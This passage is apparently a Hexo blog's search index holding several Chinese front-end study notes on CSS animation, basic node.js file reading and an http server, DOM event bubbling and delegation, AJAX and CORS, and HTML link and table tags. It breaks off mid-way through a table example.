<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSS知识小结</title>
    <url>/2022/03/08/CSS%E7%9F%A5%E8%AF%86%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="浏览器渲染原理"><a href="#浏览器渲染原理" class="headerlink" title="浏览器渲染原理"></a>浏览器渲染原理</h2><ol>
<li>解析html文档并构建DOM树</li>
<li>解析CSS标签并构建CSSOM树</li>
<li>结合DOM树和CSSOM树成一颗渲染树（render tree）</li>
<li>布局渲染树（layout），将所有渲染树的所有节点进行平面合成</li>
<li>绘制渲染树（painting），将布局绘制在屏幕上</li>
</ol>
<p><img src="https://s2.loli.net/2022/03/08/ryYILf5aVwxQ9u1.png" alt="1480597-08e6f204c42595ae.png"></p>
<p>第4、5步合称为渲染，网页生成的时候至少会渲染一次，用户访问过程中还会不断重新渲染</p>
<p>重新渲染就是要重新生成布局和重新绘制，分别称为“重排”和“重绘”。重绘不一定重排，但重排必然导致重绘。</p>
<p>参考文章：<br><a href="https://www.ruanyifeng.com/blog/2015/09/web-page-performance-in-depth.html" target="_blank" rel="noopener">https://www.ruanyifeng.com/blog/2015/09/web-page-performance-in-depth.html</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Performance/How_browsers_work" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/Performance/How_browsers_work</a></p>
<h2 id="CSS动画–transform"><a href="#CSS动画–transform" class="headerlink" title="CSS动画–transform"></a>CSS动画–transform</h2><ol>
<li>位移translate<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">translateX(2em); translateY(-50px); translate(12px, 50%);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>用translate(-50%, -50%)做元素绝对居中<br><a href="http://js.jirengu.com/sisefaxuzo/2/edit?html,css,output" target="_blank" rel="noopener">http://js.jirengu.com/sisefaxuzo/2/edit?html,css,output</a></p>
<ol start="2">
<li><p>缩放scale</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scaleX(2); scaleY(0.5); scale(2, 0.5);</span><br></pre></td></tr></table></figure>
</li>
<li><p>旋转rotate</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rotateX(10deg); rotateY(10deg); rotate(45deg);</span><br></pre></td></tr></table></figure>
</li>
<li><p>倾斜skew</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">skewX(30deg); skewY(1.07rad); skew(30deg, 20deg);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>一般配合transition使用<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">transition: 属性名 | 时长 | 过渡方式 | 延迟 </span><br><span class="line">eg：transition：left 200ms ease</span><br><span class="line"></span><br><span class="line">过渡方式：linear | ease | ease-in | ease-out | ease-in-out | step-start | step-end</span><br></pre></td></tr></table></figure></p>
<p>tips：</p>
<ul>
<li>可用逗号分隔两个属性<br>transition：left 200ms,top 400ms;</li>
<li>可用all代表所有属性<br>transition：all 2s;</li>
</ul>
<p>举个栗子🌰<br><a href="http://js.jirengu.com/veceporavo/1/edit?html,css,output" target="_blank" rel="noopener">http://js.jirengu.com/veceporavo/1/edit?html,css,output</a></p>
<h2 id="CSS动画–animation"><a href="#CSS动画–animation" class="headerlink" title="CSS动画–animation"></a>CSS动画–animation</h2><p>第一步：声明关键帧@keyframes xxx，有两种语法from…to…和百分数<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@keyframes</span> xxx &#123;</span><br><span class="line">  <span class="selector-tag">from</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">0%</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-tag">to</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">100%</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> yyy &#123;</span><br><span class="line">  0% &#123; <span class="attribute">top</span>: <span class="number">0</span>; <span class="attribute">left</span>: <span class="number">0</span>; &#125;</span><br><span class="line">  30% &#123; <span class="attribute">top</span>: <span class="number">50px</span>; &#125;</span><br><span class="line">  68%, 72% &#123; <span class="attribute">left</span>: <span class="number">50px</span>; &#125;</span><br><span class="line">  100% &#123; <span class="attribute">top</span>: <span class="number">100px</span>; <span class="attribute">left</span>: <span class="number">100%</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>第二步：添加动画animation<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">animation: 动画名 | 时长 | 过渡方式 | 延迟 | 次数 | 方向 | 填充模式 | 是否暂停</span><br><span class="line"></span><br><span class="line">时长：1<span class="selector-tag">s</span>或1000<span class="selector-tag">ms</span></span><br><span class="line">过渡方式：linear | ease | ease-in | ease-out | ease-in-out | step-start | step-end </span><br><span class="line">次数：1 | 10 | infinite</span><br><span class="line">方向：reverse | alternate | alternate-reverse</span><br><span class="line">填充模式：none | forwards | backwards | both </span><br><span class="line">是否暂停：paused | running</span><br></pre></td></tr></table></figure></p>
<p>举个栗子🌰<br><a href="http://js.jirengu.com/bivavexere/1/edit?html,css,output" target="_blank" rel="noopener">http://js.jirengu.com/bivavexere/1/edit?html,css,output</a></p>
]]></content>
  </entry>
  <entry>
    <title>CRM法入门node.js</title>
    <url>/2018/08/24/CRM%E6%B3%95%E5%85%A5%E9%97%A8node-js/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>CRM套路入门node.js<br><a id="more"></a></p>
<h2 id="CRM套路"><a href="#CRM套路" class="headerlink" title="CRM套路"></a>CRM套路</h2><ul>
<li>C（copy）抄</li>
<li>R（run）运行</li>
<li>M（modify）修改<h2 id="fs-文件系统"><a href="#fs-文件系统" class="headerlink" title="fs 文件系统"></a>fs 文件系统</h2><h3 id="fs-readFile-path-options-callback-异步读取文件"><a href="#fs-readFile-path-options-callback-异步读取文件" class="headerlink" title="fs.readFile(path[, options], callback)异步读取文件"></a>fs.readFile(path[, options], callback)异步读取文件</h3>1、新建text.js文件，编辑text.js文件如下：（官方文档抄）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fs.readFile(&apos;/404&apos;, (err, data) =&gt; &#123;  // 首先给出一个绝对不存在的文件/404</span><br><span class="line">  if (err) throw err;</span><br><span class="line">  console.log(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>2、命令行输入<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node text.js  // 运行文件会看到抛出错误</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/08/24/5b7ffea7254cf.png" alt="alt text"></p>
<p>3、解决方法是在文件顶部加入：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let fs = require(&apos;fs&apos;)  // 从node中加载该模块</span><br></pre></td></tr></table></figure></p>
<p>4、此时重新运行，看到报错为没有该/404文件<br><img src="https://i.loli.net/2018/08/24/5b7ffea6e9735.png" alt="alt text"></p>
<p>5、此时在桌面创建一个1.txt文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let fs = require(&apos;fs&apos;)</span><br><span class="line">fs.readFile(&apos;/Users/ringcrl/Desktop/1.txt&apos;, (err, data) =&gt; &#123;  // 切记这里创建的文件不能写成~/Desktop/1.txt，命令行可以识别~，没说nodejs也可以！！！</span><br><span class="line">  console.log(err);  // 这里将错误和数据都打印出来</span><br><span class="line">  console.log(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/08/24/5b80008e4a363.png" alt="alt text"></p>
<p>6、调用data.toString<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let fs = require(&apos;fs&apos;)</span><br><span class="line">fs.readFile(&apos;/Users/ringcrl/Desktop/1.txt&apos;, (err, data) =&gt; &#123;</span><br><span class="line">  console.log(err);</span><br><span class="line">  console.log(data.toString);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>修改1.txt中的内容为： 我是1.txt ， 运行可以看到打印出1.txt中的内容</p>
<h3 id="fs-readFileSync-path-options-同步读取文件"><a href="#fs-readFileSync-path-options-同步读取文件" class="headerlink" title="fs.readFileSync(path[, options])同步读取文件"></a>fs.readFileSync(path[, options])同步读取文件</h3><p>1、官方文档抄代码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let fs = require(&apos;fs&apos;)</span><br><span class="line"></span><br><span class="line">let data = fs.readFileSync(&apos;/Users/ringcrl/Desktop/1.txt&apos;)</span><br><span class="line">console.log(data.toString());</span><br></pre></td></tr></table></figure></p>
<p>可以看到同样打印出了1.txt中的内容<br><img src="https://i.loli.net/2018/08/24/5b80033684428.png" alt="alt text"></p>
<h2 id="创建一个http-server"><a href="#创建一个http-server" class="headerlink" title="创建一个http server"></a>创建一个http server</h2><p>一般来说stackoverflow上都有可以直接拿过来跑的代码，注意搜索时的关键词eg：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stackoverflow nodejs set response -express  // -express的意思是除去带有express关键字的内容</span><br></pre></td></tr></table></figure></p>
<p>text.js<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let http = require(&apos;http&apos;)</span><br><span class="line"></span><br><span class="line">let server = http.createServer(function(req,res)&#123;</span><br><span class="line">    console.log(req.url)</span><br><span class="line">    res.statusCode = 201</span><br><span class="line">    res.write(&apos;hello&apos;);</span><br><span class="line">    res.end()  // 不调用的话就一直在发送请求</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">server.listen(9999)  // 监听的端口号</span><br><span class="line">console.log(&apos;9999&apos;)</span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>DOM事件模型&amp;事件委托</title>
    <url>/2022/03/29/DOM%E4%BA%8B%E4%BB%B6%E6%A8%A1%E5%9E%8B-%E4%BA%8B%E4%BB%B6%E5%A7%94%E6%89%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="事件模型"><a href="#事件模型" class="headerlink" title="事件模型"></a>事件模型</h2><p>一个事件发生后，会在子元素和父元素之间传播（propagation），这种传播分成三阶段</p>
<ul>
<li>捕获阶段（capture phase）：从window对象传导到目标节点（上层传到底层）</li>
<li>目标阶段（target phase）：在目标节点上触发</li>
<li>冒泡阶段（bubbling phase）：从目标节点传导回window对象（从底层传回上层）</li>
</ul>
<p><img src="https://s2.loli.net/2022/03/29/iWs6lfUzHTeZC5v.png" alt="dom.png"></p>
<h3 id="冒泡（bubbling-phase）"><a href="#冒泡（bubbling-phase）" class="headerlink" title="冒泡（bubbling phase）"></a>冒泡（bubbling phase）</h3><p>当一个事件发生在一个元素上，它会首先运行在该元素上的处理程序，然后运行其父元素的处理程序，一直向上到其他祖先</p>
<p>假设我们有 3 层嵌套 FORM &gt; DIV &gt; P，它们各自拥有一个处理程序：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">style</span>&gt;</span><br><span class="line">  <span class="selector-tag">body</span> * &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid blue;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form onclick=<span class="string">"alert('form')"</span>&gt;FORM</span><br><span class="line">  &lt;div onclick=<span class="string">"alert('div')"</span>&gt;DIV</span><br><span class="line">    &lt;p onclick=<span class="string">"alert('p')"</span>&gt;P&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br></pre></td></tr></table></figure>
<p>当你点击内部的p标签会首先运行 onclick：</p>
<ol>
<li>在该 p标签 上的。</li>
<li>然后是外部 div标签 上的。</li>
<li>然后是外部 form标签 上的。</li>
<li>以此类推，直到最后的 document 对象。</li>
</ol>
<p>点击 p标签，那么我们将看到 3 个 alert：p → div → form。</p>
<p>这个过程称为冒泡，因为事件是从内部冒泡到所有父级元素，就像水里的气泡一样</p>
<h3 id="event-target-与-event-currentTarget"><a href="#event-target-与-event-currentTarget" class="headerlink" title="event.target 与 event.currentTarget"></a>event.target 与 event.currentTarget</h3><ul>
<li>引发事件的那个嵌套层级最深的元素被称为目标元素,可以通过 event.target 访问。</li>
<li>event.target —— 是引发事件的“目标”元素，也就是用户操作的元素</li>
<li>this(=event.currentTarget) —— 是“当前”元素，也就是程序员监听的元素</li>
</ul>
<p>🌰举个例子🌰</p>
<p>如果我们有一个处理程序 form.onclick，它可以“捕获”表单内的所有点击。无论用户点击发生在哪里，它都会冒泡到 form 并运行处理程序。</p>
<p>在 form.onclick 处理程序中：</p>
<ul>
<li>this（=event.currentTarget）是 <form> 元素，因为处理程序在它上面运行（程序员监听的元素）</form></li>
<li>event.target 是表单中实际被用户点击的元素</li>
<li>event.target 等于 event.currentTarget的情况：当点击事件发生在 form 元素上时</li>
</ul>
<h3 id="阻止冒泡"><a href="#阻止冒泡" class="headerlink" title="阻止冒泡"></a>阻止冒泡</h3><p>用于停止冒泡的方法是event.stopPropagation()，下面这个例子中，点击button元素，body.onclick不会生效<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onclick</span>=<span class="string">"alert(`the bubbling doesn't reach here`)"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"event.stopPropagation()"</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="捕获（capture-phase）"><a href="#捕获（capture-phase）" class="headerlink" title="捕获（capture phase）"></a>捕获（capture phase）</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">div.addEventListener(<span class="string">'click'</span>, fn, bool)</span><br></pre></td></tr></table></figure>
<ul>
<li>bool 不传 或为 falsy(默认值)，则在 <strong>冒泡阶段</strong> 设置处理程序fn（一般默认情况就是冒泡）</li>
<li>bool 为 true，则在 <strong>捕获阶段</strong> 设置处理程序fn（true 是 {capture: true} 的简写形式）</li>
</ul>
<p>在现实世界中，当事故发生时，当地警方会最先做出反应。他们最了解发生这件事的地方。然后，如果需要，上级主管部门再进行处理。</p>
<p>事件处理程序也是如此。特定于 td元素 的处理程序可能恰好适合于该 td元素，这个处理程序知道关于该元素的所有信息。所以该处理程序应该首先获得机会。然后，它的直接父元素也了解相关上下文，但了解的内容会少一些，以此类推，直到处理一般性概念并运行最后一个处理程序的最顶部的元素为止。</p>
<h2 id="事件委托"><a href="#事件委托" class="headerlink" title="事件委托"></a>事件委托</h2><ul>
<li>如果我们有许多以类似方式处理的元素，那么就不必为每个元素分配一个处理程序 —— 而是将单个处理程序放在它们的共同祖先上</li>
<li>这种方式是基于事件传播过程中，逐层冒泡总能被祖先节点捕获</li>
<li>在处理程序中，我们获取 event.target 以查看事件实际发生的位置并进行处理</li>
</ul>
<h3 id="事件委托的优点"><a href="#事件委托的优点" class="headerlink" title="事件委托的优点"></a>事件委托的优点</h3><ol>
<li>节省监听数，也就是节省了内存</li>
</ol>
<p>当你想要监听100个按钮的点击事件，在每个按钮上添加onclick事件显然是笨拙的做法。用事件委托我们可以监听100个按钮的祖先元素，等到冒泡阶段，再判断 event.target 是不是这100个按钮中的一个<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">div.addEventListener(<span class="string">'click'</span>, (e) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> t = event.target</span><br><span class="line">    <span class="keyword">if</span>(t.tagName.toLowerCase() === <span class="string">'button'</span>)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'button被点击了'</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'button data-id是'</span>+ t.dataset.id)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<ol start="2">
<li>可以动态监听元素</li>
</ol>
<p>当我们想要监听一个暂时还不存在的元素时，可以监听它的祖先，在用户点击了后看是不是我想要监听的元素<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> button = <span class="built_in">document</span>.createElement(<span class="string">'button'</span>)</span><br><span class="line">    button.textContent = <span class="string">'click me'</span></span><br><span class="line">    div1.appendChild(button)</span><br><span class="line">&#125;,<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">div1.addEventListener(<span class="string">'click'</span>,(e)=&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> t = e.target</span><br><span class="line">    <span class="keyword">if</span>(t.targetName.toLowerCase() === <span class="string">'button'</span>)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'button被click'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
]]></content>
  </entry>
  <entry>
    <title>AJAX</title>
    <url>/2018/08/20/AJAX/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Ajax 的主要优势就是对页面的请求以异步的方式发送到服务器，而服务器不会以整个页面来响应请求，它会在后台处理，与此同时用户还能继续浏览页面并与页面交互。<br><a id="more"></a><br>Ajax 的核心技术就是 XMLHttpResquest 对象，这个对象充当浏览器中的脚本（客户端）与服务器之间的中间人角色，以往的请求都是由浏览器发出，而JS通过这个对象可以自己发送请求，同时自己处理响应。</p>
<h3 id="使用原生JS写一个AJAX请求"><a href="#使用原生JS写一个AJAX请求" class="headerlink" title="使用原生JS写一个AJAX请求"></a>使用原生JS写一个AJAX请求</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getNewContent()&#123;</span><br><span class="line">    let request = new XMLHttpRequest()  // 创建一个新对象</span><br><span class="line">    request.open(method,url);  // open 方法用来指定请求方法，请求地址或路径</span><br><span class="line">    request.onreadystatechange = function()&#123;  // onreadystatechange 是一个事件处理函数，在服务器给 XMLHttpRequest 对象送回响应时触发，函数内容主要是处理响应</span><br><span class="line">        if(request.readyState === 4)&#123;  // 监听请求状态的改变，当 readyState 的属性变成4时，说明请求完成了</span><br><span class="line">            if(request.status &gt;= 200 &amp;&amp; request.status &lt; 300)&#123;  // 如果请求完成，且状态码返回2xx，表示请求成功</span><br><span class="line">                console.log(request.responseText)</span><br><span class="line">            &#125;else if(request.status &gt;= 400)&#123;  // 如果请求完成，且状态码返回4xx，表示请求失败</span><br><span class="line">                console.log(&apos;请求失败&apos;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    request.send(body)  // 在指定了请求体，也明确了如何处理响应后，就可以用 send 方法来发送请求</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="jQuery对ajax的封装"><a href="#jQuery对ajax的封装" class="headerlink" title="jQuery对ajax的封装"></a>jQuery对ajax的封装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$.get(&apos;filename&apos;).then(function(response)&#123;</span><br><span class="line">    // 这里是response的内容</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>目前常见的是用ajax请求JSON格式的数据<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$.get(&apos;/data.php&apos;).then(function(response)&#123;</span><br><span class="line">    // response内容为 &#123; &quot;name&quot;: &quot;jayce&quot; &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><p>在使用AJAX时要注意同源策略，使用XMLHttpRequest对象发送请求只能访问与其所在的HTML处于同一个域中的数据，不能向其他域发送请求。同源政策的目的是为了保证用户信息的安全，防止恶意的网站窃取数据。只有（协议+域名+端口）一模一样时才允许发 AJAX 请求，eg：</p>
<ul>
<li><a href="http://baidu.com" target="_blank" rel="noopener">http://baidu.com</a> 可以向 <a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a> 发 AJAX 请求吗？ no协议不同</li>
<li><a href="http://baidu.com:80" target="_blank" rel="noopener">http://baidu.com:80</a> 可以向 <a href="http://baidu.com:81" target="_blank" rel="noopener">http://baidu.com:81</a> 发 AJAX 请求吗？ no端口不一样</li>
</ul>
<h3 id="CORS跨域"><a href="#CORS跨域" class="headerlink" title="CORS跨域"></a>CORS跨域</h3><p>CORS全称是跨域资源共享（Cross-origin resource sharing）能克服 AJAX 只能同源使用的限制，告诉浏览器我们是一家的别阻止他。简单来说就是服务端在响应头中添加一个 Access-Control-Allow-Origin 的头部，头部的值为客户端的域名，eg：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">response.setHeader(&apos;Access-Control-Allow-Origin&apos;,&apos;url&apos;)</span><br></pre></td></tr></table></figure></p>
<h3 id="JSONP与AJAX"><a href="#JSONP与AJAX" class="headerlink" title="JSONP与AJAX"></a>JSONP与AJAX</h3><p>相同点：</p>
<ul>
<li>ajax和jsonp的调用方式很像，目的一样，都是请求url，然后把服务器返回的数据进行处理</li>
</ul>
<p>不同点：</p>
<ul>
<li><p>AJAX（异步的Javascript和XML）核心是通过XMLHttpRequest请求内容，支持get、post、delete等。（通过CORS可以突破同源政策的限制实现跨域请求）</p>
</li>
<li><p>JSONP的核心则是通过动态添加script标签来调用服务器提供的js脚本（后缀.json)，只支持get请求。（网页通过添加一个script元素向服务器请求JSON数据，这种做法不受同源政策的限制，服务器在收到请求后，将数据打包放在一个指定名字的回调函数里传回来）</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>ajax</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML难点标签</title>
    <url>/2022/03/03/HTML%E9%9A%BE%E7%82%B9%E6%A0%87%E7%AD%BE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>打开html文件的方法<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http-server -c-1 或简写为 hs -c-1</span><br><span class="line">parcel index.html</span><br></pre></td></tr></table></figure></p>
<h2 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h2><h3 id="href属性"><a href="#href属性" class="headerlink" title="href属性"></a>href属性</h3><ol>
<li><p>网址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">三种写法（推荐第三种）</span><br><span class="line">http://baidu.com</span><br><span class="line">https://baidu.com</span><br><span class="line">//baidu.com  可自动选择用http或https协议</span><br></pre></td></tr></table></figure>
</li>
<li><p>路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/a/b/c 或 a/b/c</span><br><span class="line">index.html 或 ./index.html</span><br></pre></td></tr></table></figure>
</li>
<li><p>其他用法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:;&quot;&gt;点击后什么也不发生&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;#ddd&quot;&gt;找到id为ddd的标签&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;mailto:jayce_ma.xa@foxmail.com&quot;&gt;给某人发邮件&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;tel=&quot;18912345678&quot;&gt;打电话给某人&lt;/a&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="target属性"><a href="#target属性" class="headerlink" title="target属性"></a>target属性</h3><ol>
<li><p>内置名称</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_blank 在新窗口打开</span><br><span class="line">_top 在最顶层打开</span><br><span class="line">_parent 在当前页面的上一层打开</span><br><span class="line">_self 在当前页面加载</span><br></pre></td></tr></table></figure>
</li>
<li><p>给窗口命名（作用是可重复利用窗口）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;//baidu.com&quot; target=&quot;sss&quot;&gt;baidu&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;//bilibili.com&quot; target=&quot;sss&quot;&gt;b站&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">若有window.name=sss的窗口，就用它打开，若没有就创建一个</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="与iframe一起的用法-在网页中内嵌窗口"><a href="#与iframe一起的用法-在网页中内嵌窗口" class="headerlink" title="与iframe一起的用法(在网页中内嵌窗口)"></a>与iframe一起的用法(在网页中内嵌窗口)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;//bing.com&quot; target=&quot;xxx&quot;&gt;必应&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;//bilibili.com&quot; target=&quot;xxx&quot;&gt;b站&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr/&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe style=&quot;border:none; width:100%; height:500px;&quot; name=&quot;xxx&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="table标签"><a href="#table标签" class="headerlink" title="table标签"></a>table标签</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>英文<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>中文<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>target<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>目标<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>document<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>文件<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>device<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>设备<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tfoot</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>空<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>空<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tfoot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/03/03/1nixO6kIXC9Z2Jh.png" alt="WechatIMG2311.png"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Petter<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Micky<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span 